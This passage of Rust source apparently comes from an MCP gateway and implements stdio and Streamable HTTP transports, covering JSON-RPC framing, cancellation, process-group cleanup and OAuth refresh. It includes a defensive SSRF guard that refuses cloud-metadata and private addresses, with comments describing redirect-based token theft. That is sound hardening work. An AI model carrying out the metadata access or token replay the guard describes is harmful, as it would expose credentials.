                }
                line.clear();
            }
        });

        Ok(StdioTransport {
            child,
            #[cfg(windows)]
            job: Some(job),
            stdin,
            rx,
            stderr: stderr_buf,
            next_id: 1,
            read_timeout: STDIO_READ_TIMEOUT,
            armed,
            launcher,
            server_handler: None,
            pending_mrtr: None,
            progress,
            protocol_meta: None,
            subscription_listener_id: None,
        })
    }

    /// Bind the sink that routes this server's `notifications/progress` back to
    /// the client that minted the token (SOU-444). Set by the gateway after
    /// spawn, so the drain thread picks it up without a constructor change.
    pub fn set_progress_sink(&mut self, sink: Option<ProgressSink>) {
        *self
            .progress
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner) = sink;
    }

    /// Build a useful error for when the child's stdout closed (it exited or
    /// crashed). Includes the exit status and the tail of stderr when available -
    /// that is where "package not found" or "missing API key" actually shows up.
    fn closed_error(&mut self) -> String {
        // The child just exited; give its stderr drain a brief moment to flush.
        std::thread::sleep(Duration::from_millis(150));
        let status = self.child.try_wait().ok().flatten();
        let tail = self
            .stderr
            .lock()
            .map(|b| b.trim().to_string())
            .unwrap_or_default();
        let mut msg = String::from("downstream server exited");
        if let Some(code) = status.and_then(|s| s.code()) {
            msg.push_str(&format!(" (status {code})"));
        }
        if tail.is_empty() {
            msg.push_str(" without output. Check the command, args, and any required API keys.");
        } else {
            msg.push_str(":\n");
            msg.push_str(&tail);
        }
        msg
    }
}

impl Transport for StdioTransport {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
        self.request_with_cancel(method, params, None)
    }

    fn request_with_cancel(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        let mut params = params;
        if let Some(protocol) = &self.protocol_meta {
            merge_protocol_meta(&mut params, protocol);
        }
        let (downstream_id, outbound) = if let Some(pending) = self.pending_mrtr.take() {
            let input_required = pending.input_required();
            let response = match pending.response_for_retry(method, &params) {
                Err(error) => {
                    self.pending_mrtr = Some(pending);
                    return Err(error);
                }
                Ok(Some(response)) => response,
                Ok(None) => {
                    self.pending_mrtr = Some(pending);
                    return Ok(input_required);
                }
            };
            (pending.downstream_request_id.clone(), response)
        } else {
            let id = self.next_id;
            self.next_id += 1;
            let downstream_id = json!(id);
            let request = json!({
                "jsonrpc": "2.0",
                "id": downstream_id.clone(),
                "method": method,
                "params": params
            });
            (downstream_id, request)
        };

        // A broken stdin pipe means the child is gone: a health failure, not a protocol error.
        let mut cancel_after_write = None;
        let cancel_guard;
        {
            let mut stdin = self.stdin.lock().map_err(|_| {
                TransportError::Unavailable("downstream stdin lock poisoned".into())
            })?;
            cancel_guard = if let Some(ctx) = cancel {
                let client_request_id = ctx.client_request_id.clone();
                let registry = ctx.registry.clone();
                let guard = registry.register(
                    client_request_id.clone(),
                    CancelEntry {
                        stdin: Arc::clone(&self.stdin),
                        downstream_id: downstream_id.clone(),
                    },
                );
                cancel_after_write = Some((registry, client_request_id));
                Some(guard)
            } else {
                None
            };
            writeln!(stdin, "{outbound}")
                .map_err(|e| TransportError::Unavailable(e.to_string()))?;
            stdin.flush().map_err(|e| TransportError::Unavailable(e.to_string()))?;
        }
        if let Some((registry, client_request_id)) = cancel_after_write {
            if registry.is_cancelled(&client_request_id) {
                registry.forward_cancel_if_ready(&client_request_id);
            }
        }
        let _cancel_guard = cancel_guard;

        // Read until the response with our id arrives, skipping notifications.
        // The deadline bounds the whole wait so an unresponsive server fails fast
        // instead of hanging the thread (and the batch probe) indefinitely.
        let deadline = Instant::now() + self.read_timeout;
        loop {
            let remaining = deadline
                .checked_duration_since(Instant::now())
                .unwrap_or_default();
            let line = match self.rx.recv_timeout(remaining) {
                Ok(l) => l,
                Err(RecvTimeoutError::Timeout) => {
                    // A launcher child that is alive but never answered `initialize`
                    // even after the long budget is almost certainly still installing
                    // its package (cold npm/PyPI cache, slow network). Say so: a bare
                    // timeout reads as a broken server when it isn't. A dead child
                    // never reaches here (its stdout closing ends the wait below).
                    let alive = self.child.try_wait().map(|s| s.is_none()).unwrap_or(false);
                    if self.launcher && alive && method == "initialize" {
                        return Err(TransportError::Unavailable(
                            "timed out waiting for 'initialize'; the launcher is likely \
                             still downloading the server package (first run on a cold \
                             cache). It usually connects on the next refresh."
                                .to_string(),
                        ));
                    }
                    return Err(TransportError::Unavailable(format!(
                        "timed out waiting for '{method}' response"
                    )));
                }
                Err(RecvTimeoutError::Disconnected) => {
                    return Err(TransportError::Unavailable(self.closed_error()))
                }
            };
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            let value: Value = match serde_json::from_str(trimmed) {
                Ok(v) => v,
                Err(_) => continue,
            };
            if is_server_initiated_request(&value) {
                if let Some(handler) = &self.server_handler {
                    match handler(&value) {
                        Some(ServerRequestAction::Respond(response)) => {
                            let mut stdin = self.stdin.lock().map_err(|_| {
                                TransportError::Unavailable(
                                    "downstream stdin lock poisoned".into(),
                                )
                            })?;
                            writeln!(stdin, "{response}")
                                .map_err(|e| TransportError::Unavailable(e.to_string()))?;
                            stdin
                                .flush()
                                .map_err(|e| TransportError::Unavailable(e.to_string()))?;
                            continue;
                        }
                        Some(ServerRequestAction::InputRequired) => {
                            let pending = PendingLegacyMrtr::new(
                                value,
                                downstream_id.clone(),
                                method,
                                &params,
                            )?;
                            let result = pending.input_required();
                            self.pending_mrtr = Some(pending);
                            return Ok(result);
                        }
                        None => {}
                    }
                }
            }
            if ids_match(value.get("id"), Some(&downstream_id)) {
                if let Some(err) = value.get("error") {
                    return Err(TransportError::Rpc(err.clone()));
                }
                return Ok(value.get("result").cloned().unwrap_or(Value::Null));
            }
        }
    }

    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        // Same as the request path: a modern connection stamps its protocol
        // metadata on notifications too, so every message tells one story.
        let mut params = params;
        if let Some(protocol) = &self.protocol_meta {
            merge_protocol_meta(&mut params, protocol);
        }
        let msg = json!({ "jsonrpc": "2.0", "method": method, "params": params });
        let mut stdin = self
            .stdin
            .lock()
            .map_err(|_| TransportError::Fatal("downstream stdin lock poisoned".into()))?;
        writeln!(stdin, "{msg}").map_err(|e| TransportError::Fatal(e.to_string()))?;
        stdin.flush().map_err(|e| TransportError::Fatal(e.to_string()))
    }

    fn set_read_timeout(&mut self, timeout: Duration) {
        self.read_timeout = timeout;
    }

    fn connect_timeout(&self) -> Duration {
        if self.launcher {
            LAUNCHER_CONNECT_TIMEOUT
        } else {
            STDIO_CONNECT_TIMEOUT
        }
    }

    fn arm_tools_watch(&mut self) {
        self.armed.store(true, Ordering::SeqCst);
    }

    fn set_server_request_handler(&mut self, handler: ServerRequestHandler) {
        self.server_handler = Some(handler);
    }

    fn set_protocol_meta(&mut self, meta: Option<Value>) {
        self.protocol_meta = meta;
    }

    fn set_subscription_listener(
        &mut self,
        filter: SubscriptionFilter,
    ) -> Result<(), TransportError> {
        if let Some(previous) = self.subscription_listener_id.take() {
            self.notify(
                "notifications/cancelled",
                json!({
                    "requestId": previous,
                    "reason": "Toolport replaced the subscription filter"
                }),
            )?;
        }
        let id = self.next_id;
        self.next_id += 1;
        let mut params = filter.params();
        if let Some(protocol) = &self.protocol_meta {
            merge_protocol_meta(&mut params, protocol);
        }
        let message = json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": "subscriptions/listen",
            "params": params,
        });
        let mut stdin = self
            .stdin
            .lock()
            .map_err(|_| TransportError::Fatal("downstream stdin lock poisoned".into()))?;
        writeln!(stdin, "{message}")
            .map_err(|error| TransportError::Unavailable(error.to_string()))?;
        stdin
            .flush()
            .map_err(|error| TransportError::Unavailable(error.to_string()))?;
        self.subscription_listener_id = Some(id);
        Ok(())
    }
}

/// Kill the whole process group a downstream server was spawned into, so
/// `npx`->node (and `uvx`->python) grandchildren die with the wrapper instead of
/// leaking on every server toggle and router rebuild. The Windows counterpart is
/// the Job Object, which terminates descendants when its handle closes.
///
/// Signalling a process group is unforgiving if the target is wrong, so this is
/// deliberately conservative and falls back to killing just the direct child:
///
/// * **Only while the child is unreaped.** `try_wait` elsewhere in this type can
///   reap the child, after which its pid is free for the OS to reuse and a
///   `killpg` could hit an unrelated group. An unreaped child is a zombie at
///   worst, and a zombie's pid cannot be recycled.
/// * **Only when the child leads its own group.** [`apply_process_group_isolation`]
///   makes pgid == pid at spawn, so anything else means the isolation did not
///   take. Without this check a child that stayed in *our* group would turn this
///   into a `killpg` of the gateway and the AI client that spawned it.
#[cfg(unix)]
fn kill_process_group(child: &mut Child) {
    // Minimal FFI, matching the extern-fn style used elsewhere here rather than
    // taking on libc as a dependency for two calls.
    extern "C" {
        fn getpgid(pid: i32) -> i32;
        fn killpg(pgid: i32, sig: i32) -> i32;
    }
    const SIGKILL: i32 = 9;

    // Already exited AND reaped: the pid may belong to someone else now.
    if matches!(child.try_wait(), Ok(Some(_))) {
        return;
    }
    let pid = child.id() as i32;
    // SAFETY: plain libc calls on an integer pid. `pid` is still unreaped, so it
    // is either live or a zombie and cannot have been recycled.
    let leads_own_group = unsafe { getpgid(pid) } == pid;
    if leads_own_group {
        // SAFETY: as above. Kills the wrapper and every descendant it spawned.
        unsafe { killpg(pid, SIGKILL) };
    } else {
        // Isolation didn't take; kill only what we're certain we own.
        let _ = child.kill();
    }
}

impl Drop for StdioTransport {
    fn drop(&mut self) {
        #[cfg(windows)]
        drop(self.job.take());
        #[cfg(unix)]
        kill_process_group(&mut self.child);
        // Reaps the direct child. Grandchildren were signalled above but are not
        // ours to reap; they are reparented to init, which reaps them.
        let _ = self.child.wait();
    }
}

/// Normalize a JSON-RPC id (number or string) to a string for comparison.
fn id_key(v: &Value) -> Option<String> {
    match v {
        Value::Number(n) => Some(n.to_string()),
        Value::String(s) => Some(s.clone()),
        _ => None,
    }
}

/// Whether an SSE message's id matches the request id. Tolerant of number-vs-string
/// encoding (some servers echo a numeric id as a string). A `None` wanted id means
/// take the first message (used when we didn't send an id).
fn ids_match(got: Option<&Value>, wanted: Option<&Value>) -> bool {
    match wanted {
        None => true,
        Some(w) => match (id_key(w), got.and_then(id_key)) {
            (Some(a), Some(b)) => a == b,
            _ => false,
        },
    }
}

/// A callback that can proactively mint a fresh token before expiry or force a
/// refresh after a 401/403. `force = false` returns `Ok(None)` when the current
/// token is still fresh. A proactive error may fall back to the current token;
/// a forced error is surfaced as a per-server authentication failure.
pub type RefreshFn = Box<dyn Fn(bool) -> Result<Option<String>, String> + Send + Sync>;

/// Interactive OAuth step-up callback. Unlike a refresh-token exchange, this
/// obtains user consent for the challenged scope and returns a new access token.
pub type ScopeReauthorizeFn = Box<dyn Fn(&str) -> Result<String, String> + Send + Sync>;

fn insufficient_scope_challenge(response: &ureq::Response) -> Option<crate::oauth::BearerChallenge> {
    let values = response.all("www-authenticate");
    let challenge = crate::oauth::bearer_challenge(values.iter().copied())?;
    challenge
        .error
        .as_deref()
        .is_some_and(|error| error.eq_ignore_ascii_case("insufficient_scope"))
        .then_some(challenge)
}

fn authorization_operation(body: &Value) -> String {
    let method = body
        .get("method")
        .and_then(Value::as_str)
        .unwrap_or("MCP request");
    let discriminator = match method {
        "tools/call" | "prompts/get" => body
            .get("params")
            .and_then(|params| params.get("name"))
            .and_then(Value::as_str),
        "resources/read" => body
            .get("params")
            .and_then(|params| params.get("uri"))
            .and_then(Value::as_str),
        _ => None,
    };
    discriminator
        .map(|value| format!("{method}:{value}"))
        .unwrap_or_else(|| method.to_string())
}

fn canonical_scope_set(scope: &str) -> String {
    let mut scopes: Vec<&str> = scope.split_whitespace().collect();
    scopes.sort_unstable();
    scopes.dedup();
    scopes.join(" ")
}

/// Screen resolved socket addresses against the SSRF policy, fail-closed: returns
/// `Err` if ANY address is link-local / cloud-metadata, or - when `block_private` -
/// private / loopback / CGNAT. Refusing the whole set (not just filtering the bad
/// ones out) means a DNS answer that mixes a public and an internal IP can't sneak
/// the internal one through.
fn screen_resolved_addrs(
    addrs: &[std::net::SocketAddr],
    block_private: bool,
) -> std::io::Result<()> {
    for sa in addrs {
        let ip = sa.ip();
        if crate::oauth::ip_is_link_local(&ip) {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                format!("SSRF guard: refusing link-local / cloud-metadata address {ip}"),
            ));
        }
        if block_private && crate::oauth::ip_is_private(&ip) {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                format!("SSRF guard: refusing private / loopback address {ip}"),
            ));
        }
    }
    Ok(())
}

/// A ureq agent with the SSRF resolver installed. Because ureq resolves through this
/// resolver immediately before connecting, screening here validates the exact address
/// dialed - closing the resolve-then-connect (DNS-rebind) TOCTOU a separate pre-check
/// has. `block_private` extends the screen to internal addresses for untrusted inputs.
/// Redirects stay disabled so a credential-bearing request cannot be replayed to a
/// different host. Callers choose a timeout appropriate for their operation.
pub(crate) fn guarded_agent_with_timeout(
    block_private: bool,
    timeout: std::time::Duration,
) -> ureq::Agent {
    use std::net::{SocketAddr, ToSocketAddrs};
    ureq::AgentBuilder::new()
        .timeout(timeout)
        // Never follow redirects. MCP Streamable HTTP doesn't need cross-host
        // redirects, and following one would let a malicious server bounce us to an
        // internal address (SSRF, e.g. cloud metadata) or replay our Authorization
        // bearer to a host of its choosing (token theft).
        .redirects(0)
        .resolver(move |netloc: &str| -> std::io::Result<Vec<SocketAddr>> {
            let addrs: Vec<SocketAddr> = netloc.to_socket_addrs()?.collect();
            screen_resolved_addrs(&addrs, block_private)?;
            Ok(addrs)
        })
        .build()
}

/// The remote MCP transport allows longer-lived calls than short auxiliary HTTP
/// requests such as semantic embedding lookups.
fn guarded_agent(block_private: bool) -> ureq::Agent {
    guarded_agent_with_timeout(block_private, std::time::Duration::from_secs(30))
}

/// Talks to a remote MCP server over the Streamable HTTP transport: each request
/// is a POST, and the response is either a JSON body or an SSE stream carrying
/// the JSON-RPC message. A session id from `initialize` is echoed on later calls.
pub struct HttpTransport {
    url: String,
    agent: ureq::Agent,
    /// Separate pool so inline replies can POST while an SSE body is still open.
    inline_agent: ureq::Agent,
    session_id: Option<String>,
    next_id: i64,
    /// Raw bearer token (without the "Bearer " prefix), if the server needs auth.
    auth: Arc<Mutex<Option<String>>>,
    /// Called before each POST to refresh a token nearing expiry, and forced once
    /// after a 401/403 to recover from an already-expired token. A proactive
    /// `None` or error keeps the current token; a forced refresh must return a new
    /// raw token or the authentication failure is surfaced.
    refresh: Option<Arc<Mutex<RefreshFn>>>,
    /// Separate from token refresh: `insufficient_scope` requires interactive
    /// consent and a new authorization, not another token from the old grant.
    scope_reauthorize: Option<Arc<Mutex<ScopeReauthorizeFn>>>,
    /// Bound repeated browser prompts and retries per operation+scope on this
    /// connection, as required by the MCP step-up guidance.
    scope_upgrade_attempts: Arc<Mutex<HashSet<(String, String)>>>,
    /// The token a forced refresh produced and that has not yet been accepted by
    /// the server, if any.
    ///
    /// The forced-refresh budget is per *token*, not per call. A 401 answered by
    /// minting a fresh token, where that fresh token then 401s too, is not an
    /// expiry problem, so refreshing again cannot help - and against a provider
    /// that rotates the refresh token on use, each needless exchange consumes a
    /// link in the chain. Connect alone posts twice (`initialize`, then the
    /// `server/discover` era probe), so a per-call budget spends two (SOU-474).
    ///
    /// Cleared as soon as any request comes back 2xx, which is what makes this a
    /// budget rather than a latch. Relying on a proactive refresh to clear it was
    /// wrong: a provider that omits `expires_in` has no deadline, so
    /// `refresh_before_send` never fires, and the connection would 401 forever
    /// with a working refresh token in the vault - the exact case the reactive
    /// fallback exists to serve. Only a token the server has never accepted keeps
    /// the budget spent.
    forced_refresh_token: Option<String>,
    server_handler: Option<ServerRequestHandler>,
    /// Open legacy SSE response suspended while a modern upstream client
    /// fulfills a server-initiated request in a separate round trip.
    pending_mrtr: Option<PendingHttpMrtr>,
    /// Fan `notifications/resources/updated` seen mid-SSE to subscribed
    /// upstream clients (SOU-394 follow-up for remote downstreams).
    resource_updated: Option<ResourceUpdatedSink>,
    /// Route `notifications/progress` seen mid-SSE back to the client that minted
    /// the token (SOU-444).
    progress: Option<ProgressSink>,
    /// Standard per-request `_meta` for a modern (2026-07-28+) connection, merged
    /// into every outgoing request. `None` on legacy connections (SOU-445).
    protocol_meta: Option<Value>,
    /// Catalog refresh signal used by the modern HTTP listen worker.
    change_dirty: Option<Arc<AtomicU8>>,
    /// Replacing a listener increments this generation. The superseded worker
    /// drops its response on the next frame/keepalive, closing the old POST.
    listener_generation: Arc<AtomicU64>,
    subscription_listener_id: Option<i64>,
    /// Extensions Toolport declares on this connection. Held apart from
    /// `protocol_meta` because that is replaced wholesale after version
    /// negotiation; see `merge_declared_extensions`.
    declared_extensions: serde_json::Map<String, Value>,
}

struct PendingHttpMrtr {
    common: PendingLegacyMrtr,
    reader: Box<dyn BufRead + Send>,
    bytes_read: u64,
}

impl HttpTransport {
    pub fn new(url: &str) -> Self {
        Self::with_auth(url, None)
    }

    pub fn with_auth(url: &str, auth: Option<String>) -> Self {
        Self::with_auth_refresh(url, auth, None)
    }

    /// Like `with_auth`, but with a callback invoked once on a 401/403 to mint a
    /// fresh token; the request is retried with whatever it returns. Blocks
    /// link-local / cloud-metadata targets but allows private/loopback (for
    /// trusted, e.g. user-added local, servers).
    pub fn with_auth_refresh(url: &str, auth: Option<String>, refresh: Option<RefreshFn>) -> Self {
        Self::guarded(url, auth, refresh, false)
    }

    /// Like `with_auth_refresh`, but when `block_private` is set the connection also
    /// refuses private/loopback/CGNAT targets (for untrusted-provenance servers).
    /// Link-local / cloud-metadata is refused regardless.
    ///
    /// This is the DNS-rebind-safe enforcement point: the SSRF policy runs INSIDE
    /// ureq's resolver, so the IP that is validated is the exact IP ureq dials. A
    /// hostname that passed a separate pre-connect guard but then rebinds to
    /// 169.254.169.254 (or, when `block_private`, an internal address) is refused at
    /// connect time - closing the resolve-then-connect TOCTOU a standalone check has.
    pub fn guarded(
        url: &str,
        auth: Option<String>,
        refresh: Option<RefreshFn>,
        block_private: bool,
    ) -> Self {
        HttpTransport {
            url: url.to_string(),
            agent: guarded_agent(block_private),
            inline_agent: guarded_agent(block_private),
            session_id: None,
            next_id: 1,
            auth: Arc::new(Mutex::new(auth)),
            refresh: refresh.map(|refresh| Arc::new(Mutex::new(refresh))),
            scope_reauthorize: None,
            scope_upgrade_attempts: Arc::new(Mutex::new(HashSet::new())),
            forced_refresh_token: None,
            server_handler: None,
            pending_mrtr: None,
            resource_updated: None,
            progress: None,
            protocol_meta: None,
            change_dirty: None,
            listener_generation: Arc::new(AtomicU64::new(0)),
            subscription_listener_id: None,
            declared_extensions: serde_json::Map::new(),
        }
    }

    pub fn set_scope_reauthorize(&mut self, callback: Option<ScopeReauthorizeFn>) {
        self.scope_reauthorize = callback.map(|callback| Arc::new(Mutex::new(callback)));
    }

    /// Declare an extension Toolport supports on this connection.
    ///
    /// Declared per connection rather than globally: an extension is a statement
    /// about *this* server, and claiming one on a server that does not use it
    /// invites callbacks or semantics the gateway cannot service. Same reasoning
    /// as the MCP Apps declaration on catalog fetches.
    ///
    /// A legacy (pre-2026-07-28) connection has no per-request `_meta`, so there
    /// is nowhere to put this. The declaration is recorded and applied if the
    /// connection is later negotiated up; the flow itself does not depend on it.
    pub fn declare_extension(&mut self, name: &str, settings: Value) {
        self.declared_extensions.insert(name.to_string(), settings);
        if let Some(meta) = self.protocol_meta.as_mut() {
            merge_declared_extensions(meta, &self.declared_extensions);
        }
    }

    /// Wire the gateway sink for `notifications/resources/updated` seen on SSE
    /// response streams (SOU-394).
    pub fn set_resource_updated_sink(&mut self, sink: Option<ResourceUpdatedSink>) {
        self.resource_updated = sink;
    }

    /// Bind the sink that routes this server's `notifications/progress` back to
    /// the client that minted the token (SOU-444).
    pub fn set_progress_sink(&mut self, sink: Option<ProgressSink>) {
        self.progress = sink;
    }

    pub fn set_change_sink(&mut self, dirty: Option<Arc<AtomicU8>>) {
        self.change_dirty = dirty;
    }

    /// The protocol version this connection declares in the `MCP-Protocol-Version`
    /// header.
    ///
    /// From 2026-07-28 the header **MUST** equal the
    /// `io.modelcontextprotocol/protocolVersion` carried in the body's `_meta`,
    /// and a server that sees them disagree rejects the request with `400` and
    /// `HeaderMismatch` (-32020). So this has to follow whatever the connection
    /// negotiated, not a constant. Legacy connections have no protocol `_meta`
    /// and keep sending [`PROTOCOL_VERSION`] exactly as before.
    fn wire_protocol_version(&self) -> String {
        self.protocol_meta
            .as_ref()
            .and_then(|meta| meta.get("io.modelcontextprotocol/protocolVersion"))
            .and_then(Value::as_str)
            .unwrap_or(PROTOCOL_VERSION)
            .to_string()
    }

    fn is_modern(&self) -> bool {
        self.protocol_meta.is_some()
    }

    fn request_inner(
        &mut self,
        method: &str,
        params: Value,
        headers: &[(String, String)],
    ) -> Result<Value, TransportError> {
        let mut params = params;
        if let Some(protocol) = &self.protocol_meta {
            merge_protocol_meta(&mut params, protocol);
        }
        if let Some(pending) = self.pending_mrtr.take() {
            let input_required = pending.common.input_required();
            let response = match pending.common.response_for_retry(method, &params) {
                Err(error) => {
                    self.pending_mrtr = Some(pending);
                    return Err(error);
                }
                Ok(Some(response)) => response,
                Ok(None) => {
                    self.pending_mrtr = Some(pending);
                    return Ok(input_required);
                }
            };
            self.send_post_no_response(&response)?;
            let resp = self.read_sse_stream(
                pending.reader,
                pending.common.downstream_request_id.clone(),
                &pending.common.method,
                &pending.common.base_params,
                pending.bytes_read,
            )?;
            let resp = resp.ok_or_else(|| {
                TransportError::Fatal("empty resumed SSE response".to_string())
            })?;
            if let Some(err) = resp.get("error") {
                return Err(TransportError::Rpc(err.clone()));
            }
            return Ok(resp.get("result").cloned().unwrap_or(Value::Null));
        }

        let id = self.next_id;
        self.next_id += 1;
        let body = json!({ "jsonrpc": "2.0", "id": id, "method": method, "params": params });
        let resp = self
            .post_with_headers(&body, true, headers)?
            .ok_or_else(|| TransportError::Fatal("empty response".to_string()))?;
        if let Some(err) = resp.get("error") {
            return Err(TransportError::Rpc(err.clone()));
        }
        Ok(resp.get("result").cloned().unwrap_or(Value::Null))
    }

    fn inline_server_action(&self, v: &Value) -> Option<ServerRequestAction> {
        if !is_server_initiated_request(v) {
            return None;
        }
        self.server_handler.as_ref().and_then(|handler| handler(v))
    }

    /// Try to replace a token nearing expiry. Failure here is non-fatal because
    /// the current token may remain valid throughout the safety window; a real
    /// 401/403 will force one refresh attempt below.
    fn refresh_before_send(&mut self) {
        if let Some(refresh) = &self.refresh {
            if let Ok(refresh) = refresh.lock() {
                if let Ok(Some(token)) = refresh(false) {
                    *self
                        .auth
                        .lock()
                        .unwrap_or_else(std::sync::PoisonError::into_inner) = Some(token);
                }
            }
        }
    }

    /// True when the token currently in hand is one a forced refresh already
    /// produced, so its one forced exchange is spent. See [`Self::forced_refresh_token`].
    fn forced_refresh_spent(&self) -> bool {
        let auth = self
            .auth
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        auth.is_some() && *auth == self.forced_refresh_token
    }

    fn force_refresh_after_auth_error(&mut self, code: u16) -> Result<(), TransportError> {
        let Some(refresh) = self.refresh.as_ref() else {
            return Err(TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): no refresh callback configured"
            )));
        };
        let refresh = refresh
            .lock()
            .map_err(|_| TransportError::Fatal("OAuth refresh callback lock poisoned".into()))?;
        match refresh(true) {
            Ok(Some(token)) => {
                *self
                    .auth
                    .lock()
                    .unwrap_or_else(std::sync::PoisonError::into_inner) = Some(token.clone());
                // Spend the budget for this token, so a later POST on the same
                // connection does not force a second exchange for it (SOU-474).
                self.forced_refresh_token = Some(token);
                Ok(())
            }
            Ok(None) => Err(TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): token refresh returned no token"
            ))),
            Err(e) => Err(TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): token refresh failed: {e}"
            ))),
        }
    }

    fn reauthorize_after_scope_challenge(
        &mut self,
        code: u16,
        operation: &str,
        challenge: crate::oauth::BearerChallenge,
    ) -> Result<(), TransportError> {
        let required_scope = challenge
            .scope
            .map(|scope| canonical_scope_set(&scope))
            .filter(|scope| !scope.is_empty())
            .ok_or_else(|| {
                TransportError::Fatal(format!(
                    "HTTP {code} (needs authentication): OAuth reported insufficient_scope without the required scope"
                ))
            })?;
        let attempt_key = (operation.to_string(), required_scope.clone());
        let first_attempt = self
            .scope_upgrade_attempts
            .lock()
            .map_err(|_| TransportError::Fatal("OAuth scope-attempt lock poisoned".into()))?
            .insert(attempt_key);
        if !first_attempt {
            return Err(TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): OAuth scope '{required_scope}' was already requested for {operation} and remains insufficient"
            )));
        }
        let callback = self.scope_reauthorize.as_ref().ok_or_else(|| {
            TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): OAuth scope '{required_scope}' requires interactive authorization"
            ))
        })?;
        let token = callback
            .lock()
            .map_err(|_| TransportError::Fatal("OAuth scope callback lock poisoned".into()))?
            (&required_scope)
            .map_err(|e| {
                TransportError::Fatal(format!(
                    "HTTP {code} (needs authentication): OAuth scope authorization failed for '{required_scope}': {e}"
                ))
            })?;
        *self
            .auth
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner) = Some(token.clone());
        // Do not follow a freshly-authorized token's rejection with an automatic
        // refresh-token exchange: it cannot add a scope the user did not grant.
        self.forced_refresh_token = Some(token);
        Ok(())
    }

    /// POST JSON-RPC without waiting for a response body (inline replies mid-SSE).
    fn send_post_no_response(&mut self, body: &Value) -> Result<(), TransportError> {
        let payload = body.to_string();
        self.refresh_before_send();
        let mut refreshed = self.forced_refresh_spent();
        let wire_version = self.wire_protocol_version();
        let resp = loop {
            let mut req = self
                .inline_agent
                .post(&self.url)
                .set("Content-Type", "application/json")
                .set("Accept", "application/json, text/event-stream")
                .set("MCP-Protocol-Version", &wire_version);
            if !self.is_modern() {
                if let Some(sid) = &self.session_id {
                    req = req.set("Mcp-Session-Id", sid);
                }
            }
            if self.is_modern() {
                for (name, value) in modern_standard_headers(body)? {
                    req = req.set(&name, &value);
                }
            }
            let auth = self
                .auth
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .clone();
            if let Some(token) = auth.as_deref() {
                req = req.set("Authorization", &bearer_header(token));
            }
            match req.send_string(&payload) {
                Ok(resp) => break resp,
                Err(ureq::Error::Status(code, resp))
                    if (code == 401 || code == 403)
                        && insufficient_scope_challenge(&resp).is_some() =>
                {
                    let challenge = insufficient_scope_challenge(&resp)
                        .expect("match guard established an insufficient-scope challenge");
                    let _ = read_capped(resp, 8 * 1024);
                    let operation = authorization_operation(body);
                    self.reauthorize_after_scope_challenge(code, &operation, challenge)?;
                    refreshed = true;
                }
                Err(ureq::Error::Status(code, resp))
                    if (code == 401 || code == 403)
                        && !refreshed
                        && self.refresh.is_some() =>
                {
                    let _ = read_capped(resp, 8 * 1024);
                    refreshed = true;
                    self.force_refresh_after_auth_error(code)?;
                }
                Err(e) => return Err(TransportError::Fatal(e.to_string())),
            }
        };
        if !self.is_modern() {
            if let Some(sid) = resp.header("Mcp-Session-Id") {
                self.session_id = Some(sid.to_string());
            }
        }
        // Drain so the connection returns to the pool without leaving bytes unread.
        let _ = read_capped(resp, 64 * 1024);
        Ok(())
    }

    /// Read SSE `data:` frames as they arrive so server-initiated requests can be
    /// answered before the downstream closes the stream (avoids deadlock when the
    /// server waits for our inline reply before sending the final response).
    fn read_sse_response(
        &mut self,
        resp: ureq::Response,
        request: &Value,
    ) -> Result<Option<Value>, TransportError> {
        let wanted = request.get("id").cloned().unwrap_or(Value::Null);
        let method = request
            .get("method")
            .and_then(Value::as_str)
            .unwrap_or_default();
        let params = request.get("params").cloned().unwrap_or_else(|| json!({}));
        let reader: Box<dyn BufRead + Send> = Box::new(BufReader::new(
            resp.into_reader().take(MAX_RESPONSE_BYTES + 1),
        ));
        self.read_sse_stream(reader, wanted, method, &params, 0)
    }

    fn read_sse_stream(
        &mut self,
        mut reader: Box<dyn BufRead + Send>,
        wanted: Value,
        method: &str,
        params: &Value,
        mut bytes_read: u64,
    ) -> Result<Option<Value>, TransportError> {
        let mut line = String::new();
        loop {
            line.clear();
            let n = reader
                .read_line(&mut line)
                .map_err(|e| TransportError::Fatal(e.to_string()))?;
            if n == 0 {
                break;
            }
            bytes_read += n as u64;
            if bytes_read > MAX_RESPONSE_BYTES {
                return Err(TransportError::Fatal(format!(
                    "SSE response exceeded {MAX_RESPONSE_BYTES} bytes"
                )));
            }
            let trimmed = line.trim_start();
            if let Some(data) = trimmed.strip_prefix("data:") {
                let data = data.trim();
                if data.is_empty() {
                    continue;
                }
                let Ok(v) = serde_json::from_str::<Value>(data) else {
                    continue;
                };
                // Resource updates may arrive mid-stream alongside the response
                // (SOU-394). Fan them out before treating the frame as a result.
                if let Some(sink) = &self.resource_updated {
                    if let Some(uri) = resource_updated_uri(data) {
                        sink(uri);
                        continue;
                    }
                }
                // Progress for the request this stream belongs to (SOU-444).
                // Routed by token, so it is consumed here rather than being
                // mistaken for the response frame.
                if let Some(sink) = &self.progress {
                    if let Some(note) = progress_notification(data) {
                        sink(note);
                        continue;
                    }
                }
                match self.inline_server_action(&v) {
                    Some(ServerRequestAction::Respond(response)) => {
                        self.send_post_no_response(&response)?;
                        continue;
                    }
                    Some(ServerRequestAction::InputRequired) => {
                        let common =
                            PendingLegacyMrtr::new(v, wanted.clone(), method, params)?;
                        let result = common.input_required();
                        self.pending_mrtr = Some(PendingHttpMrtr {
                            common,
                            reader,
                            bytes_read,
                        });
                        return Ok(Some(json!({
                            "jsonrpc": "2.0",
                            "id": wanted,
                            "result": result
                        })));
                    }
                    None => {}
                }
                if ids_match(v.get("id"), Some(&wanted)) {
                    return Ok(Some(v));
                }
            }
        }
        Err(TransportError::Fatal(
            "no matching message in SSE stream".to_string(),
        ))
    }

